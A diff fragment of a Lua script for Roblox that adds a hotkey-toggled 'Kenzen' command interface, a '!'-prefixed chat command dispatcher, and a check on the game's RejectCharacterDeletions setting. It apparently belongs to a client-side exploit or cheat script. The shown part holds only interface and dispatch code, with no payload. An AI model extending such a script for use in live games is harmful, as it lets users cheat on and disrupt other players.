+				TweenService:Create(CommandBar,TweenInfo.new(0.5),{Position=Toggle and UDim2.new(0.5,0,0.1,0) or UDim2.new(0.5,0,0,-70)}):Play()
+			elseif input.KeyCode == Enum.KeyCode.Home then
+				BackgroundToggle = not BackgroundToggle
+				ToggleKenzen(BackgroundToggle)
+			end
+		end
+	end)
+	
+	ToggleKenzen = function(Bool)
+		Background.BackgroundTransparency = Bool and 0.5 or 1
+		Background:WaitForChild("Console").Visible = Bool
+		Background:WaitForChild("Settings").Visible = Bool
+		Background:WaitForChild("Commands").Visible = Bool
+		GetToPath(CommandsFrame,"Frame.TextButton").Visible = not Bool
+		Background.Active = Bool
+	end; ToggleKenzen(true)
+	
+	task.defer(function()
+		repeat fwait(0/1) until Player
+		Player.Chatted:Connect(function(msg)
+			if string.sub(msg,1,1) == "!" then
+				msg = string.sub(msg,2)
+				local Args = string.split(msg," ")
+				local CommandName = string.lower(Args[1]); table.remove(Args,1)
+				for i,v in pairs(Commands) do
+					if i == CommandName or table.find(v.Alias,CommandName) then
+						Commands[i].Function(Args)
+					end
+				end
+			end
+		end)
+	end)
+	local RCD = CheckForRCD() and "Enabled" or "Disabled"
+	printconsole("RCD","RejectCharacterDeletions is " .. RCD)
+end
+
 IsGameLoaded(); Part:Destroy()
 local GameLoadedIn = tick() - LoadTick
 printconsole(tostring("Game loaded in " .. RoundNumber(GameLoadedIn) .. " (" .. RoundNumber(GameLoadedIn)*10000 .. "ms)"))
+
+if ToggleKenzen then
+	ToggleKenzen(false)
+end
 
 Player = Players.LocalPlayer
 
